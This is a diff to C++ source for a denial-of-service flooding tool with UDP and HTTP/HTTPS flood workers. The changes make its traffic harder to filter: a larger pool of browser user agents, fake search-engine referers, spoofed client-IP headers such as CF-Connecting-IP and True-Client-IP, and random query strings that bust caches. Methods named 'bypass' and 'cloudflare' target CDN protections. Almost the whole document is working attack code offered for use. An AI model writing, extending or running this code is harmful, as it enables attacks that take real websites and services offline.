@@ -82,18 +82,37 @@ static std::string random_ip() {
 }
 
 static const std::vector<std::string> USER_AGENTS = {
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.113 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
 };
 
 static std::string get_random_user_agent() {
     thread_local std::mt19937 gen(std::random_device{}());
     std::uniform_int_distribution<size_t> dist(0, USER_AGENTS.size() - 1);
     return USER_AGENTS[dist(gen)];
+}
+
+static const std::vector<std::string> REFERERS = {
+    "https://www.google.com/search?q=",
+    "https://www.bing.com/search?q=",
+    "https://duckduckgo.com/?q=",
+    "https://yandex.com/search/?text=",
+    "https://t.co/",
+    "https://www.facebook.com/l.php?u=",
+    "https://www.reddit.com/r/"
+};
+
+static std::string get_random_referer(const std::string &host) {
+    thread_local std::mt19937 gen(std::random_device{}());
+    std::uniform_int_distribution<size_t> dist(0, REFERERS.size() - 1);
+    return REFERERS[dist(gen)] + host;
 }
 
 // ==================== LAYER 4 UDP FLOODS ====================
@@ -280,51 +299,69 @@ static void worker_layer3(const std::string &method, const std::string &target_i
 }
 
 // ==================== LAYER 7 HTTP / HTTPS FLOODS ====================
+static std::string build_http_request(const std::string &method, const std::string &host, const std::string &path) {
+    std::string req_path = path;
+    if (method == "cache" || method == "bypass" || method == "cloudflare" || method == "tlsx" || method == "httpx" || method == "rapidflood") {
+        req_path += (req_path.find('?') == std::string::npos ? "?" : "&") + random_string(8) + "=" + random_string(8);
+    }
+
+    std::string req = "GET " + req_path + " HTTP/1.1\r\n"
+                      "Host: " + host + "\r\n"
+                      "User-Agent: " + get_random_user_agent() + "\r\n"
+                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                      "Accept-Language: en-US,en;q=0.9\r\n"
+                      "Accept-Encoding: gzip, deflate, br\r\n"
+                      "Referer: " + get_random_referer(host) + "\r\n"
+                      "Connection: keep-alive\r\n"
+                      "Upgrade-Insecure-Requests: 1\r\n"
+                      "Sec-Fetch-Dest: document\r\n"
+                      "Sec-Fetch-Mode: navigate\r\n"
+                      "Sec-Fetch-Site: cross-site\r\n"
+                      "Sec-Fetch-User: ?1\r\n";
+
+    if (method == "bypass" || method == "cloudflare" || method == "tlsx") {
+        std::string fake_ip = random_ip();
+        req += "X-Forwarded-For: " + fake_ip + "\r\n"
+               "CF-Connecting-IP: " + fake_ip + "\r\n"
+               "X-Real-IP: " + fake_ip + "\r\n"
+               "X-Client-IP: " + fake_ip + "\r\n"
+               "True-Client-IP: " + fake_ip + "\r\n";
+    }
+
+    if (method == "cache" || method == "bypass" || method == "cloudflare") {
+        req += "Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n"
+               "Pragma: no-cache\r\n";
+    }
+
+    req += "\r\n";
+    return req;
+}
+
 static void worker_http(const std::string &method, const std::string &host, const std::string &target_ip, int port, const std::string &path) {
     struct sockaddr_in sin{};
     sin.sin_family = AF_INET;
     sin.sin_port = htons(port > 0 ? port : 80);
     inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);
 
+    char recv_buf[1024];
+
     while (g_running.load(std::memory_order_relaxed)) {
         int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sock < 0) continue;
+        if (sock < 0) {
+            std::this_thread::yield();
+            continue;
+        }
 
         struct timeval tv{2, 0};
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
         if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
-            std::string req_path = path;
-            if (method == "cache" || method == "bypass" || method == "cloudflare") {
-                req_path += (req_path.find('?') == std::string::npos ? "?" : "&") + random_string(8) + "=" + random_string(8);
-            }
-
-            std::string req = "GET " + req_path + " HTTP/1.1\r\n"
-                              "Host: " + host + "\r\n"
-                              "User-Agent: " + get_random_user_agent() + "\r\n"
-                              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
-                              "Accept-Language: en-US,en;q=0.5\r\n"
-                              "Connection: keep-alive\r\n";
-
-            if (method == "bypass" || method == "cloudflare") {
-                std::string fake_ip = random_ip();
-                req += "X-Forwarded-For: " + fake_ip + "\r\n"
-                       "CF-Connecting-IP: " + fake_ip + "\r\n"
-                       "X-Real-IP: " + fake_ip + "\r\n";
-            }
-
-            if (method == "cache") {
-                req += "Cache-Control: no-cache, no-store, must-revalidate\r\n"
-                       "Pragma: no-cache\r\n";
-            }
-
-            req += "\r\n";
-
-            int send_cycles = (method == "rapidflood" || method == "httpx") ? 20 : 1;
-            for (int i = 0; i < send_cycles && g_running.load(std::memory_order_relaxed); ++i) {
-                if (send(sock, req.c_str(), req.size(), MSG_NOSIGNAL) <= 0) break;
+            std::string req = build_http_request(method, host, path);
+            if (send(sock, req.c_str(), req.size(), MSG_NOSIGNAL) > 0) {
                 g_total_packets.fetch_add(1, std::memory_order_relaxed);
+                // Read response to ensure request is registered by CDN / proxy
+                recv(sock, recv_buf, sizeof(recv_buf), 0);
             }
         }
         close(sock);
@@ -338,9 +375,14 @@ static void worker_https(const std::string &method, SSL_CTX *ctx, const std::str
     sin.sin_port = htons(port > 0 ? port : 443);
     inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);
 
+    char recv_buf[1024];
+
     while (g_running.load(std::memory_order_relaxed)) {
         int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sock < 0) continue;
+        if (sock < 0) {
+            std::this_thread::yield();
+            continue;
+        }
 
         struct timeval tv{3, 0};
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
@@ -353,36 +395,11 @@ static void worker_https(const std::string &method, SSL_CTX *ctx, const std::str
                 SSL_set_tlsext_host_name(ssl, host.c_str());
 
                 if (SSL_connect(ssl) > 0) {
-                    std::string req_path = path;
-                    if (method == "cache" || method == "bypass" || method == "cloudflare" || method == "tlsx") {
-                        req_path += (req_path.find('?') == std::string::npos ? "?" : "&") + random_string(8) + "=" + random_string(8);
-                    }
-
-                    std::string req = "GET " + req_path + " HTTP/1.1\r\n"
-                                      "Host: " + host + "\r\n"
-                                      "User-Agent: " + get_random_user_agent() + "\r\n"
-                                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
-                                      "Accept-Language: en-US,en;q=0.9\r\n"
-                                      "Connection: keep-alive\r\n";
-
-                    if (method == "bypass" || method == "cloudflare") {
-                        std::string fake_ip = random_ip();
-                        req += "X-Forwarded-For: " + fake_ip + "\r\n"
-                               "CF-Connecting-IP: " + fake_ip + "\r\n"
-                               "X-Real-IP: " + fake_ip + "\r\n";
-                    }
-
-                    if (method == "cache") {
-                        req += "Cache-Control: no-cache, no-store, must-revalidate\r\n"
-                               "Pragma: no-cache\r\n";
-                    }
-
-                    req += "\r\n";
-
-                    int cycles = (method == "rapidflood" || method == "tlsx" || method == "httpx") ? 20 : 5;
-                    for (int i = 0; i < cycles && g_running.load(std::memory_order_relaxed); ++i) {
-                        if (SSL_write(ssl, req.c_str(), (int)req.size()) <= 0) break;
+                    std::string req = build_http_request(method, host, path);
+                    if (SSL_write(ssl, req.c_str(), (int)req.size()) > 0) {
                         g_total_packets.fetch_add(1, std::memory_order_relaxed);
+                        // Read response bytes to complete transaction
+                        SSL_read(ssl, recv_buf, sizeof(recv_buf));
                     }
                 }
                 SSL_shutdown(ssl);
@@ -407,8 +424,8 @@ int main(int argc, char *argv[]) {
     std::string method = basename(prog_path);
 
     int arg_offset = 1;
-    if (method == "flood" || method == "aio" || method == "methods") {
-        if (argc < 4) {
+    if (method.find("flood") != std::string::npos || method == "aio" || method == "methods") {
+        if (argc < 5) {
             std::cerr << "Usage: " << argv[0] << " <method> <host/url> <port> <time_seconds> [threads]\n";
             return 1;
         }
